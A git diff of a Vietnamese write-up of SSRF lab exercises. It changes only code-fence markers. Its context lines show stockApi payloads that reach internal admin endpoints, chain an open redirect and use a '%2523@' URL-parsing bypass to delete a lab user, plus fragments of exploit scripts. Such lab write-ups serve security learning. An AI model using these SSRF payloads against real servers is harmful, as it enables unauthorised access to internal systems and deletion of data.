@@ -83,7 +83,7 @@ mình có thể SSRF - sử dụng chính stockApi này để query lên các lo
 
 và mình đã viết lại script khai thác
 
-```python=
+```python
 #!/usr/bin/python3.7
 import requests
 import re
@@ -160,7 +160,7 @@ stockApi=http://192.168.0.140:8080/admin/delete?username=carlos
 ```
 
 mình đã viết lại script khai thác:
-```python=
+```python
 #!/usr/bin/python3.7
 import requests
 import re
@@ -244,7 +244,7 @@ stockApi=http://127.1/Admin/delete?username=carlos
 ```
 
 mình đã viết lại script khai thác:
-```python=
+```python
 #!/usr/bin/python3.7
 import requests
 import re
@@ -321,7 +321,7 @@ và mình xóa người dùng carlos bằng
 stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
 ```
 và mình đã viết lại script khai thác
-```python=
+```python
 #!/usr/bin/python3.7
 import requests
 import re
@@ -415,7 +415,7 @@ và mình xóa người dùng carlos bằng
 stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
 ```
 và mình đã viết lại script khai thác
-```python=
+```python
 #!/usr/bin/python3.7
 import requests
 import re
